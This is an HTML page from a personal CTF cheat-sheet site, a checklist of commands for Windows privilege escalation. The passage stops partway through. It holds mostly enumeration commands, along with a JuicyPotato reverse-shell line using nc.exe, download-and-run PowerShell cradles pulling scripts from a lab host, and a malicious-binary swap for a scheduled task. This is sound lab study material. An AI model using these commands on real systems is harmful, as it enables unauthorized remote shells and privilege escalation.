@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.1.0.746091498184">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.1.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Big Checklist</title>
+    <meta name="title" content="Big Checklist">
+    <meta name="description" content="IF 64 bits use: %SystemRoot%\\Sysnative\\reg.exe">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://caueb.github.io/ctf-cheat-sheets/windowsprivesc/big-checkl-6737d/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://caueb.github.io/ctf-cheat-sheets/windowsprivesc/big-checkl-6737d/">
+    <meta property="og:title" content="Big Checklist">
+    <meta property="og:description" content="IF 64 bits use: %SystemRoot%\\Sysnative\\reg.exe">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://caueb.github.io/ctf-cheat-sheets/windowsprivesc/big-checkl-6737d/">
+    <meta property="twitter:title" content="Big Checklist">
+    <meta property="twitter:description" content="IF 64 bits use: %SystemRoot%\\Sysnative\\reg.exe">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../resources/css/retype.css?v=3.1.0.746091498184" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.1.0.746091498184" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.1.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.1.0.746091498184" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.1.0.746091498184" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                        <g fill="currentColor">
+                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                        </g>
+                                    </svg>
+                                    <span>GitHub</span>
+                                </a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                        <g fill="currentColor">
+                                            <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
+                                        </g>
+                                    </svg>
+                                    <span>HackTheBox</span>
+                                </a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                <g fill="currentColor">
+                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                </g>
+                                            </svg>
+                                            <span>GitHub</span>
+                                        </a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                <g fill="currentColor">
+                                                    <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
+                                                </g>
+                                            </svg>
+                                            <span>HackTheBox</span>
+                                        </a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="big-checklist" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#big-checklist">#</doc-anchor-trigger>
+        <span>Big Checklist</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="system-enum">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#system-enum">#</doc-anchor-trigger>
+        <span>System Enum</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">systeminfo
+Systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;System Type&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="updates">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#updates">#</doc-anchor-trigger>
+        <span>Updates</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">wmic qfe get Caption,Description,HotFixID,InstalledOn
+Wmic logicaldisk get caption,description</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="applications">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#applications">#</doc-anchor-trigger>
+        <span>Applications</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">wmic product get name, version, vendor
+accesschk.exe -uws &quot;Everyone&quot; &quot;C:\\Program Files&quot;
+Get-ChildItem &quot;C:\\Program Files&quot; -Recurse | Get-ACL | ?{$_.AccessToString -match &quot;Everyone\\sAllow\\s\\sModify&quot;}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="services">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#services">#</doc-anchor-trigger>
+        <span>Services</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">sc query state=all | findstr &quot;SERVICE_NAME:&quot;
+wmic service get name,displayname,pathname,startmode
+Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="disk-volume">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#disk-volume">#</doc-anchor-trigger>
+        <span>Disk Volume</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">mountvol</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="drivers---in-powershell">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#drivers---in-powershell">#</doc-anchor-trigger>
+        <span>Drivers - in powershell</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
+Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like &quot;*VMware*&quot;}</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="user-enum">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#user-enum">#</doc-anchor-trigger>
+        <span>User enum</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">whoami
+echo %USERNAME%
+whoami /priv
+whoami /groups
+whoami /all
+
+If user has SeImpersonate privs, try JuicyPotato/PrintSpoofer:
+juicy.exe -l 4444 -p c:\\windows\\system32\\cmd.exe -a &quot;/c  \\\\192.168.119.155\\test\\nc.exe -e cmd.exe 192.168.119.155 4447&quot; -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
+
+net user
+net localgroup
+net user /domain
+net group /domain
+net group /domain &lt;Group Name&gt;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="network--firewall--av--defender">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#network--firewall--av--defender">#</doc-anchor-trigger>
+        <span>Network / Firewall / AV / Defender</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">ipconfig /all
+route print
+arp -A
+netsh firewall show state
+netsh firewall show config
+Sc query windefend
+Netsh advfirewall firewall dump, netsh firewall show state
+</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="checklist-automated-tools">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#checklist-automated-tools">#</doc-anchor-trigger>
+        <span>Checklist automated tools</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">- Run Winpeas
+- Run PowerUp.ps1
+powershell.exe -exec Bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString('&lt;http://192.168.119.155/PowerUp.ps1&gt;');Invoke-AllChecks&quot;
+- Run Sherlock.ps1
+powershell.exe -exec Bypass -C &quot;IEX (New-Object Net.WebClient).DownloadString('&lt;http://192.168.119.155/Sherlock.ps1&gt;');Find-AllVulns&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="check-folder-permissions">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#check-folder-permissions">#</doc-anchor-trigger>
+        <span>Check folder permissions</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">accesschk.exe /accepteula -wvu
+Folder Perms
+\\\\192.168.119.155\\test\\accesschk.exe /accepteula -uwdqs &quot;Authenticated Users&quot; C:\\
+\\\\192.168.119.155\\test\\accesschk.exe /accepteula -uwdqs &quot;Everyone&quot; C:\\
+File Perms
+\\\\192.168.119.155\\test\\accesschk.exe /accepteula -uwqs  &quot;Authenticated Users&quot; C:\\*.*
+\\\\192.168.119.155\\test\\accesschk.exe /accepteula -uwdqs &quot;Everyone&quot; C:\\*.*</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="running-processes-to-started-services">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#running-processes-to-started-services">#</doc-anchor-trigger>
+        <span>Running processes to started services</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">tasklist /SVC</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="windows-services-that-are-started">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#windows-services-that-are-started">#</doc-anchor-trigger>
+        <span>Windows services that are started</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">net start</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="look-for-3rd-party-drivers">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#look-for-3rd-party-drivers">#</doc-anchor-trigger>
+        <span>Look for 3rd party drivers</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">DRIVERQUERY</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="check-if-wmic-is-allowed-on-low-priv-shell-mostly-allowed-on-win7-win8">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#check-if-wmic-is-allowed-on-low-priv-shell-mostly-allowed-on-win7-win8">#</doc-anchor-trigger>
+        <span>Check if WMIC is allowed on low priv shell. Mostly allowed on Win7 /win8</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">wmic /?
+Automated WMIC info - &lt;https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar&gt;
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="check-directory-permissions">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#check-directory-permissions">#</doc-anchor-trigger>
+        <span>Check directory permissions</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">cacls &quot;C:\\Python27&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="scheduled-tasks">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#scheduled-tasks">#</doc-anchor-trigger>
+        <span>Scheduled Tasks</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">schtasks /query /fo LIST /v  # Copy to schtasks.txt on local and run
+kali@kali$ cat schtask.txt | grep &quot;SYSTEM\\|Task To Run&quot; | grep -B 1 SYSTEM
+dir %SystemRoot%\\Tasks
+e.g. c:\\windows\\tasks\\
+e.g. c:\\windows\\system32\\tasks\\
+
+# If we have write permissions on the scheduled tasks binary / binary dir
+accesschk.exe -dqv &quot;E:\\GrabLogs&quot;
+copy evil-tftp.exe E:\\GrabLogs\\tftp.exe</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="startups-and-autoruns">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#startups-and-autoruns">#</doc-anchor-trigger>
+        <span>Startups and autoruns</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-powershell"><code v-pre class="language-powershell">reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+wmic startup get caption,command
+reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\R
+reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
+dir &quot;C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup&quot;
+dir &quot;C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup&quot;
+
+# Check access on the files and dir using accesschk , if writebale , we can write malicious binary.
+accesschk64.exe /accepteula -wvu &quot;C:\\Program Files\\Autorun Program&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="service-permissions">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#service-permissions">#</doc-anchor-trigger>
+        <span>Service Permissions</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="check-if-service-config-can-be-modified">
+    <h3>
